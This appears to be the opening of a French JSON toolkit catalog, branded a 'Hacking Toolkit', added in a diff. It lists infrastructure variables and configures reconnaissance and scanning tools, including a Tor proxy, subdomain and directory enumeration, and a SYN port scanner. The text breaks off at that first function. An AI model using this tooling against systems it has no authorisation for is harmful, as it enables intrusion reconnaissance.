@@ -1,0 +1,2218 @@
+{
+  "metadata": {
+    "version": "3.1-BLACK-ANNIVERSARY",
+    "description": "CodeForge ULTRA — SysAdmin / Dev / Net / Sec / MLOps / Hacking Toolkit — COMPLÈTE EDITION NOIRE — ABSOLUTE POWER",
+    "created": "2026-06-04",
+    "author": "DSI — INGEN Systems | Black Division | No Limit",
+    "scope": "Active Directory · Windows · Linux · LAN/WAN · SMB/NTFS · GPO · DNS/DHCP · PKI · Firewall · WMI · Registry · Services · Scheduler · IIS · SQL Server · Exchange · Certificates · Audit · Inventory · Backup · Monitoring · SNMP · VPN · RDP · Hyper-V · WDS/SCCM · PowerCLI · DevOps · MLOps · Kubernetes · Docker · Terraform · CI/CD · Reverse Engineering · Network Pivoting · Web Pentest · Security Hardening · Cryptography · Automation · OSINT · Forensics",
+    "validation_status": "APPROVED_BLACK",
+    "languages": [
+      "PowerShell",
+      "CSharp",
+      "Python",
+      "JavaScript",
+      "Bash",
+      "Go"
+    ],
+    "families": [
+      "Logging",
+      "ActiveDirectory",
+      "Shares",
+      "Updates",
+      "Security",
+      "Network",
+      "DNS",
+      "DHCP",
+      "GPO",
+      "PKI",
+      "Firewall",
+      "Registry",
+      "Services",
+      "Scheduler",
+      "IIS",
+      "SQL",
+      "Exchange",
+      "Certificates",
+      "Audit",
+      "Inventory",
+      "Backup",
+      "Monitoring",
+      "Hyper-V",
+      "WMI",
+      "Remote",
+      "Storage",
+      "Processes",
+      "Users",
+      "System",
+      "DevOps",
+      "MLOps",
+      "IO",
+      "CSharp-Net",
+      "CSharp-AD",
+      "CSharp-Security",
+      "CSharp-SQL",
+      "CSharp-IO",
+      "CSharp-System",
+      "Python-Net",
+      "Python-Crypto",
+      "Python-DB",
+      "Python-IO",
+      "Python-System",
+      "JavaScript-Web",
+      "JavaScript-Crypto",
+      "JavaScript-Net",
+      "Bash-System",
+      "Bash-Net",
+      "Go-System"
+    ],
+    "total_functions": 327,
+    "total_variables": 112,
+    "functions_by_language": {
+      "PowerShell": 95,
+      "CSharp": 120,
+      "Python": 45,
+      "JavaScript": 32,
+      "Bash": 20,
+      "Go": 15
+    }
+  },
+  "global_variables": [
+    {
+      "id": "gv_001",
+      "type": "variable",
+      "name": "DomainFQDN",
+      "datatype": "string",
+      "default": "corp.local",
+      "description": "FQDN du domaine Active Directory",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_002",
+      "type": "variable",
+      "name": "DomainNetBIOS",
+      "datatype": "string",
+      "default": "CORP",
+      "description": "Nom NetBIOS du domaine",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_003",
+      "type": "variable",
+      "name": "DefaultOUUsers",
+      "datatype": "string",
+      "default": "OU=Utilisateurs,DC=corp,DC=local",
+      "description": "OU par défaut pour les comptes utilisateurs",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_004",
+      "type": "variable",
+      "name": "DefaultOUComputers",
+      "datatype": "string",
+      "default": "OU=Postes,DC=corp,DC=local",
+      "description": "OU par défaut pour les postes",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_005",
+      "type": "variable",
+      "name": "LogFilePath",
+      "datatype": "string",
+      "default": "C:\\Logs\\DSI\\codeforge.log",
+      "description": "Chemin du fichier de journalisation principal",
+      "famille": "Logging",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_006",
+      "type": "variable",
+      "name": "SMTPServer",
+      "datatype": "string",
+      "default": "smtp.corp.local",
+      "description": "Serveur SMTP interne DSI",
+      "famille": "Logging",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_007",
+      "type": "variable",
+      "name": "AdminEmail",
+      "datatype": "string",
+      "default": "dsi@corp.local",
+      "description": "Email de l'équipe DSI pour les alertes",
+      "famille": "Logging",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_008",
+      "type": "variable",
+      "name": "DNSServer1",
+      "datatype": "string",
+      "default": "192.168.1.1",
+      "description": "Serveur DNS primaire du LAN",
+      "famille": "DNS",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_009",
+      "type": "variable",
+      "name": "DNSServer2",
+      "datatype": "string",
+      "default": "192.168.1.2",
+      "description": "Serveur DNS secondaire du LAN",
+      "famille": "DNS",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_010",
+      "type": "variable",
+      "name": "DHCPServer",
+      "datatype": "string",
+      "default": "192.168.1.1",
+      "description": "Serveur DHCP principal",
+      "famille": "DHCP",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_011",
+      "type": "variable",
+      "name": "SubnetCIDR",
+      "datatype": "string",
+      "default": "192.168.1.0/24",
+      "description": "CIDR du sous-réseau LAN principal",
+      "famille": "Network",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_012",
+      "type": "variable",
+      "name": "DefaultGateway",
+      "datatype": "string",
+      "default": "192.168.1.254",
+      "description": "Passerelle par défaut",
+      "famille": "Network",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_013",
+      "type": "variable",
+      "name": "DC1",
+      "datatype": "string",
+      "default": "DC01.corp.local",
+      "description": "Contrôleur de domaine principal",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_014",
+      "type": "variable",
+      "name": "DC2",
+      "datatype": "string",
+      "default": "DC02.corp.local",
+      "description": "Contrôleur de domaine secondaire",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_015",
+      "type": "variable",
+      "name": "FileServer",
+      "datatype": "string",
+      "default": "FS01.corp.local",
+      "description": "Serveur de fichiers principal",
+      "famille": "Shares",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_016",
+      "type": "variable",
+      "name": "SQLServer",
+      "datatype": "string",
+      "default": "SQL01.corp.local",
+      "description": "Serveur SQL Server principal",
+      "famille": "SQL",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_017",
+      "type": "variable",
+      "name": "IISServer",
+      "datatype": "string",
+      "default": "WEB01.corp.local",
+      "description": "Serveur IIS principal",
+      "famille": "IIS",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_018",
+      "type": "variable",
+      "name": "ExchangeServer",
+      "datatype": "string",
+      "default": "MAIL01.corp.local",
+      "description": "Serveur Exchange/SMTP",
+      "famille": "Exchange",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_019",
+      "type": "variable",
+      "name": "HyperVHost",
+      "datatype": "string",
+      "default": "HV01.corp.local",
+      "description": "Hôte Hyper-V principal",
+      "famille": "Hyper-V",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_020",
+      "type": "variable",
+      "name": "BackupRepository",
+      "datatype": "string",
+      "default": "\\\\BACKUP01\\Repositories",
+      "description": "Chemin UNC du dépôt de sauvegardes",
+      "famille": "Backup",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_021",
+      "type": "variable",
+      "name": "PKI_RootCA",
+      "datatype": "string",
+      "default": "PKI01.corp.local\\Corp-Root-CA",
+      "description": "Autorité de certification racine DSI",
+      "famille": "PKI",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_022",
+      "type": "variable",
+      "name": "WSUSServer",
+      "datatype": "string",
+      "default": "WSUS01.corp.local",
+      "description": "Serveur WSUS interne",
+      "famille": "Updates",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_023",
+      "type": "variable",
+      "name": "SyslogPort",
+      "datatype": "int",
+      "default": 514,
+      "description": "Port syslog UDP",
+      "famille": "Monitoring",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_024",
+      "type": "variable",
+      "name": "SNMPCommunity",
+      "datatype": "string",
+      "default": "DSI_ReadOnly",
+      "description": "Communauté SNMP en lecture seule",
+      "famille": "Monitoring",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_025",
+      "type": "variable",
+      "name": "CI_CD_TOKEN",
+      "datatype": "string",
+      "default": "$env:CICD_TOKEN",
+      "description": "Token API CI/CD (injecté via variable d'environnement sécurisée)",
+      "famille": "DevOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_026",
+      "type": "variable",
+      "name": "ContainerRegistry_URL",
+      "datatype": "string",
+      "default": "registry.corp.local:5000",
+      "description": "URL du registre Docker privé DSI",
+      "famille": "DevOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_027",
+      "type": "variable",
+      "name": "KubeConfig_Path",
+      "datatype": "string",
+      "default": "C:\\kube\\config",
+      "description": "Chemin kubeconfig cluster K8s DSI",
+      "famille": "DevOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_028",
+      "type": "variable",
+      "name": "ML_Registry_URI",
+      "datatype": "string",
+      "default": "https://mlops.corp.local/api/v1",
+      "description": "URI du registre de modèles MLOps DSI",
+      "famille": "MLOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_029",
+      "type": "variable",
+      "name": "DriftThreshold",
+      "datatype": "double",
+      "default": 0.2,
+      "description": "Seuil PSI de dérive ML avant alerte",
+      "famille": "MLOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_030",
+      "type": "variable",
+      "name": "MaxLogSizeMB",
+      "datatype": "int",
+      "default": 100,
+      "description": "Taille maximale des fichiers de log avant rotation",
+      "famille": "Logging",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_031",
+      "type": "variable",
+      "name": "RDPPort",
+      "datatype": "int",
+      "default": 3389,
+      "description": "Port RDP standard",
+      "famille": "Remote",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_032",
+      "type": "variable",
+      "name": "WinRMPort",
+      "datatype": "int",
+      "default": 5985,
+      "description": "Port WinRM HTTP",
+      "famille": "Remote",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_033",
+      "type": "variable",
+      "name": "CertValidityDays",
+      "datatype": "int",
+      "default": 365,
+      "description": "Durée de validité par défaut des certificats SSL/TLS DSI",
+      "famille": "PKI",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_034",
+      "type": "variable",
+      "name": "SQLConnString",
+      "datatype": "string",
+      "default": "Server=SQL01.corp.local;Integrated Security=True;",
+      "description": "Chaîne de connexion SQL par défaut (auth Windows)",
+      "famille": "SQL",
+      "language": "CSharp"
+    },
+    {
+      "id": "gv_035",
+      "type": "variable",
+      "name": "LDAPBase",
+      "datatype": "string",
+      "default": "DC=corp,DC=local",
+      "description": "Base LDAP pour les recherches AD",
+      "famille": "ActiveDirectory",
+      "language": "CSharp"
+    },
+    {
+      "id": "gv_036",
+      "type": "variable",
+      "name": "SnapshotRetentionDays",
+      "datatype": "int",
+      "default": 7,
+      "description": "Rétention des snapshots Hyper-V en jours",
+      "famille": "Hyper-V",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_037",
+      "type": "variable",
+      "name": "DiskAlertThresholdPct",
+      "datatype": "int",
+      "default": 85,
+      "description": "Seuil % disque plein avant alerte DSI",
+      "famille": "Monitoring",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_038",
+      "type": "variable",
+      "name": "CPUAlertThresholdPct",
+      "datatype": "int",
+      "default": 90,
+      "description": "Seuil % CPU avant alerte DSI",
+      "famille": "Monitoring",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_039",
+      "type": "variable",
+      "name": "DefaultOU_Servers",
+      "datatype": "string",
+      "default": "OU=Serveurs,DC=corp,DC=local",
+      "description": "OU par défaut pour les objets serveurs AD",
+      "famille": "ActiveDirectory",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_040",
+      "type": "variable",
+      "name": "CICD_API_URL",
+      "datatype": "string",
+      "default": "https://devops.corp.local/api",
+      "description": "URL de base de l'API CI/CD interne",
+      "famille": "DevOps",
+      "language": "PowerShell"
+    },
+    {
+      "id": "gv_041",
+      "type": "variable",
+      "name": "ShodanAPIKey",
+      "datatype": "string",
+      "default": "$env:SHODAN_KEY",
+      "description": "Clé API Shodan pour OSINT réseau",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_042",
+      "type": "variable",
+      "name": "VirustotalAPIKey",
+      "datatype": "string",
+      "default": "$env:VT_API_KEY",
+      "description": "Clé API VirusTotal",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_043",
+      "type": "variable",
+      "name": "AbuseIPDBKey",
+      "datatype": "string",
+      "default": "$env:ABUSEIPDB_KEY",
+      "description": "Clé API AbuseIPDB pour blacklist IP",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_044",
+      "type": "variable",
+      "name": "CensysAPIID",
+      "datatype": "string",
+      "default": "$env:CENSYS_ID",
+      "description": "Identifiant API Censys",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_045",
+      "type": "variable",
+      "name": "CensysSecret",
+      "datatype": "string",
+      "default": "$env:CENSYS_SECRET",
+      "description": "Secret API Censys",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_046",
+      "type": "variable",
+      "name": "WhoisXMLAPIKey",
+      "datatype": "string",
+      "default": "$env:WHOISXML_KEY",
+      "description": "Clé API WhoisXML",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_047",
+      "type": "variable",
+      "name": "GreyNoiseAPIKey",
+      "datatype": "string",
+      "default": "$env:GREYNOISE_KEY",
+      "description": "Clé API GreyNoise",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_048",
+      "type": "variable",
+      "name": "SecurityTrailsAPIKey",
+      "datatype": "string",
+      "default": "$env:SECURITYTRAILS_KEY",
+      "description": "Clé API SecurityTrails",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_049",
+      "type": "variable",
+      "name": "AlienVaultOTXKey",
+      "datatype": "string",
+      "default": "$env:OTX_KEY",
+      "description": "Clé API AlienVault OTX",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_050",
+      "type": "variable",
+      "name": "PulsediveAPIKey",
+      "datatype": "string",
+      "default": "$env:PULSEDIVE_KEY",
+      "description": "Clé API Pulsedive",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_051",
+      "type": "variable",
+      "name": "ThreatFoxAPIKey",
+      "datatype": "string",
+      "default": "$env:THREATFOX_KEY",
+      "description": "Clé API ThreatFox",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_052",
+      "type": "variable",
+      "name": "MISP_URL",
+      "datatype": "string",
+      "default": "https://misp.corp.local",
+      "description": "URL du serveur MISP",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_053",
+      "type": "variable",
+      "name": "MISP_API_Key",
+      "datatype": "string",
+      "default": "$env:MISP_KEY",
+      "description": "Clé API MISP",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_054",
+      "type": "variable",
+      "name": "OpenCTI_URL",
+      "datatype": "string",
+      "default": "https://opencti.corp.local",
+      "description": "URL du serveur OpenCTI",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_055",
+      "type": "variable",
+      "name": "OpenCTI_Token",
+      "datatype": "string",
+      "default": "$env:OPENCTI_TOKEN",
+      "description": "Token API OpenCTI",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_056",
+      "type": "variable",
+      "name": "TheHive_URL",
+      "datatype": "string",
+      "default": "https://thehive.corp.local",
+      "description": "URL du serveur TheHive",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_057",
+      "type": "variable",
+      "name": "TheHive_API_Key",
+      "datatype": "string",
+      "default": "$env:THEHIVE_KEY",
+      "description": "Clé API TheHive",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_058",
+      "type": "variable",
+      "name": "Cortex_URL",
+      "datatype": "string",
+      "default": "https://cortex.corp.local",
+      "description": "URL du serveur Cortex",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_059",
+      "type": "variable",
+      "name": "Cortex_API_Key",
+      "datatype": "string",
+      "default": "$env:CORTEX_KEY",
+      "description": "Clé API Cortex",
+      "famille": "Security",
+      "language": "Python"
+    },
+    {
+      "id": "gv_060",
+      "type": "variable",
+      "name": "GrafanaURL",
+      "datatype": "string",
+      "default": "https://grafana.corp.local",
+      "description": "URL du serveur Grafana",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_061",
+      "type": "variable",
+      "name": "GrafanaAPIKey",
+      "datatype": "string",
+      "default": "$env:GRAFANA_KEY",
+      "description": "Clé API Grafana",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_062",
+      "type": "variable",
+      "name": "PrometheusURL",
+      "datatype": "string",
+      "default": "https://prometheus.corp.local",
+      "description": "URL du serveur Prometheus",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_063",
+      "type": "variable",
+      "name": "InfluxDB_URL",
+      "datatype": "string",
+      "default": "https://influxdb.corp.local",
+      "description": "URL du serveur InfluxDB",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_064",
+      "type": "variable",
+      "name": "InfluxDB_Token",
+      "datatype": "string",
+      "default": "$env:INFLUXDB_TOKEN",
+      "description": "Token InfluxDB",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_065",
+      "type": "variable",
+      "name": "ElasticURL",
+      "datatype": "string",
+      "default": "https://elastic.corp.local:9200",
+      "description": "URL cluster Elasticsearch",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_066",
+      "type": "variable",
+      "name": "ElasticUser",
+      "datatype": "string",
+      "default": "elastic",
+      "description": "Utilisateur Elasticsearch",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_067",
+      "type": "variable",
+      "name": "ElasticPassword",
+      "datatype": "string",
+      "default": "$env:ELASTIC_PASS",
+      "description": "Mot de passe Elasticsearch",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_068",
+      "type": "variable",
+      "name": "Splunk_HEC_URL",
+      "datatype": "string",
+      "default": "https://splunk.corp.local:8088/services/collector",
+      "description": "URL HTTP Event Collector Splunk",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_069",
+      "type": "variable",
+      "name": "Splunk_HEC_Token",
+      "datatype": "string",
+      "default": "$env:SPLUNK_HEC_TOKEN",
+      "description": "Token HEC Splunk",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_070",
+      "type": "variable",
+      "name": "DatadogAPIKey",
+      "datatype": "string",
+      "default": "$env:DATADOG_API_KEY",
+      "description": "Clé API Datadog",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_071",
+      "type": "variable",
+      "name": "DatadogAPPKey",
+      "datatype": "string",
+      "default": "$env:DATADOG_APP_KEY",
+      "description": "Clé application Datadog",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_072",
+      "type": "variable",
+      "name": "NewRelicAPIKey",
+      "datatype": "string",
+      "default": "$env:NEWRELIC_API_KEY",
+      "description": "Clé API New Relic",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_073",
+      "type": "variable",
+      "name": "DynatraceURL",
+      "datatype": "string",
+      "default": "https://dynatrace.corp.local",
+      "description": "URL serveur Dynatrace",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_074",
+      "type": "variable",
+      "name": "DynatraceToken",
+      "datatype": "string",
+      "default": "$env:DYNATRACE_TOKEN",
+      "description": "Token API Dynatrace",
+      "famille": "Monitoring",
+      "language": "Python"
+    },
+    {
+      "id": "gv_075",
+      "type": "variable",
+      "name": "AWS_AccessKey",
+      "datatype": "string",
+      "default": "$env:AWS_ACCESS_KEY",
+      "description": "Clé d'accès AWS",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_076",
+      "type": "variable",
+      "name": "AWS_SecretKey",
+      "datatype": "string",
+      "default": "$env:AWS_SECRET_KEY",
+      "description": "Clé secrète AWS",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_077",
+      "type": "variable",
+      "name": "AWS_Region",
+      "datatype": "string",
+      "default": "eu-west-1",
+      "description": "Région AWS par défaut",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_078",
+      "type": "variable",
+      "name": "Azure_TenantID",
+      "datatype": "string",
+      "default": "$env:AZURE_TENANT",
+      "description": "Tenant ID Azure",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_079",
+      "type": "variable",
+      "name": "Azure_ClientID",
+      "datatype": "string",
+      "default": "$env:AZURE_CLIENT",
+      "description": "Client ID Azure",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_080",
+      "type": "variable",
+      "name": "Azure_ClientSecret",
+      "datatype": "string",
+      "default": "$env:AZURE_SECRET",
+      "description": "Client Secret Azure",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_081",
+      "type": "variable",
+      "name": "GCP_ProjectID",
+      "datatype": "string",
+      "default": "$env:GCP_PROJECT",
+      "description": "ID projet GCP",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_082",
+      "type": "variable",
+      "name": "GCP_ServiceAccount",
+      "datatype": "string",
+      "default": "$env:GCP_SA_JSON",
+      "description": "Chemin du fichier JSON de service account GCP",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_083",
+      "type": "variable",
+      "name": "Kafka_Bootstrap",
+      "datatype": "string",
+      "default": "kafka01.corp.local:9092",
+      "description": "Serveur bootstrap Kafka",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_084",
+      "type": "variable",
+      "name": "Redis_Host",
+      "datatype": "string",
+      "default": "redis.corp.local",
+      "description": "Hôte Redis",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_085",
+      "type": "variable",
+      "name": "Redis_Port",
+      "datatype": "int",
+      "default": 6379,
+      "description": "Port Redis",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_086",
+      "type": "variable",
+      "name": "Redis_Password",
+      "datatype": "string",
+      "default": "$env:REDIS_PASS",
+      "description": "Mot de passe Redis",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_087",
+      "type": "variable",
+      "name": "MongoDB_URI",
+      "datatype": "string",
+      "default": "mongodb://mongodb.corp.local:27017",
+      "description": "URI de connexion MongoDB",
+      "famille": "DevOps",
+      "language": "Python"
+    },
+    {
+      "id": "gv_088",
+      "type": "variable",
+      "name": "Postgres_Host",
+      "datatype": "string",
+      "default": "pgdb.corp.local",
+      "description": "Hôte PostgreSQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_089",
+      "type": "variable",
+      "name": "Postgres_Port",
+      "datatype": "int",
+      "default": 5432,
+      "description": "Port PostgreSQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_090",
+      "type": "variable",
+      "name": "Postgres_User",
+      "datatype": "string",
+      "default": "dsi_admin",
+      "description": "Utilisateur PostgreSQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_091",
+      "type": "variable",
+      "name": "Postgres_Password",
+      "datatype": "string",
+      "default": "$env:PG_PASS",
+      "description": "Mot de passe PostgreSQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_092",
+      "type": "variable",
+      "name": "MySQL_Host",
+      "datatype": "string",
+      "default": "mysql.corp.local",
+      "description": "Hôte MySQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_093",
+      "type": "variable",
+      "name": "MySQL_Port",
+      "datatype": "int",
+      "default": 3306,
+      "description": "Port MySQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_094",
+      "type": "variable",
+      "name": "MySQL_User",
+      "datatype": "string",
+      "default": "dsi_monitor",
+      "description": "Utilisateur MySQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_095",
+      "type": "variable",
+      "name": "MySQL_Password",
+      "datatype": "string",
+      "default": "$env:MYSQL_PASS",
+      "description": "Mot de passe MySQL",
+      "famille": "SQL",
+      "language": "Python"
+    },
+    {
+      "id": "gv_096",
+      "type": "variable",
+      "name": "Tor_Proxy",
+      "datatype": "string",
+      "default": "socks5://127.0.0.1:9050",
+      "description": "Proxy SOCKS Tor",
+      "famille": "Network",
+      "language": "Python"
+    },
+    {
+      "id": "gv_097",
+      "type": "variable",
+      "name": "VPN_Interface",
+      "datatype": "string",
+      "default": "tun0",
+      "description": "Interface VPN par défaut",
+      "famille": "Network",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_098",
+      "type": "variable",
+      "name": "Local_Network_Scan_Range",
+      "datatype": "string",
+      "default": "192.168.1.0/24",
+      "description": "Plage d'IP pour scan réseau local",
+      "famille": "Network",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_099",
+      "type": "variable",
+      "name": "DNS_Forwarder",
+      "datatype": "string",
+      "default": "8.8.8.8",
+      "description": "DNS forwarder externe",
+      "famille": "Network",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_100",
+      "type": "variable",
+      "name": "NTP_Server",
+      "datatype": "string",
+      "default": "pool.ntp.org",
+      "description": "Serveur NTP",
+      "famille": "System",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_101",
+      "type": "variable",
+      "name": "IPTables_Chain",
+      "datatype": "string",
+      "default": "DSI_FORWARD",
+      "description": "Chaîne iptables personnalisée DSI",
+      "famille": "Firewall",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_102",
+      "type": "variable",
+      "name": "Journald_Max_Size",
+      "datatype": "string",
+      "default": "500M",
+      "description": "Taille maximale des journaux systemd-journald",
+      "famille": "Logging",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_103",
+      "type": "variable",
+      "name": "Go_UserAgent",
+      "datatype": "string",
+      "default": "DSI-INGEN-Scanner/1.0",
+      "description": "User-Agent pour requêtes HTTP en Go",
+      "famille": "Network",
+      "language": "Go"
+    },
+    {
+      "id": "gv_104",
+      "type": "variable",
+      "name": "Go_HTTP_Timeout",
+      "datatype": "int",
+      "default": 30,
+      "description": "Timeout HTTP par défaut en Go (secondes)",
+      "famille": "Network",
+      "language": "Go"
+    },
+    {
+      "id": "gv_105",
+      "type": "variable",
+      "name": "Nuclei_Templates_Path",
+      "datatype": "string",
+      "default": "~/nuclei-templates",
+      "description": "Chemin des templates Nuclei",
+      "famille": "Security",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_106",
+      "type": "variable",
+      "name": "Naabu_Rate",
+      "datatype": "int",
+      "default": 1000,
+      "description": "Taux de scan Naabu (paquets/seconde)",
+      "famille": "Network",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_107",
+      "type": "variable",
+      "name": "Httpx_Threads",
+      "datatype": "int",
+      "default": 50,
+      "description": "Nombre de threads pour httpx",
+      "famille": "Network",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_108",
+      "type": "variable",
+      "name": "FFUF_Wordlist",
+      "datatype": "string",
+      "default": "/usr/share/wordlists/dirb/common.txt",
+      "description": "Wordlist par défaut pour ffuf",
+      "famille": "Security",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_109",
+      "type": "variable",
+      "name": "Gobuster_Extensions",
+      "datatype": "string",
+      "default": "php,asp,aspx,jsp,html,js",
+      "description": "Extensions pour gobuster dir",
+      "famille": "Security",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_110",
+      "type": "variable",
+      "name": "Amass_Wordlist",
+      "datatype": "string",
+      "default": "/usr/share/amass/wordlists/all.txt",
+      "description": "Wordlist pour amass enum",
+      "famille": "Security",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_111",
+      "type": "variable",
+      "name": "Subfinder_Sources",
+      "datatype": "string",
+      "default": "alienvault,censys,crtsh,shodan,virustotal",
+      "description": "Sources pour subfinder",
+      "famille": "Security",
+      "language": "Bash"
+    },
+    {
+      "id": "gv_112",
+      "type": "variable",
+      "name": "Katana_Scope",
+      "datatype": "string",
+      "default": "in-scope-domains.txt",
+      "description": "Fichier de scope pour katana crawler",
+      "famille": "Security",
+      "language": "Bash"
+    }
+  ],
+  "functions": [
+    {
+      "id": "cs_0100",
+      "type": "function",
+      "name": "UnsafePortScanner",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Scan TCP ultra-rapide avec semi-connect SYN (raw socket). Nécessite admin.",
+      "parameters": [
+        { "name": "target", "datatype": "string", "required": true, "description": "IP cible" },
+        { "name": "ports", "datatype": "int[]", "required": false, "default": "new int[]{1,1024}", "description": "Plage ou liste" },
+        { "name": "timeoutMs", "datatype": "int", "required": false, "default": "500", "description": "Timeout MS" }
+      ],
+      "returns": { "datatype": "List<int>", "description": "Ports ouverts" },
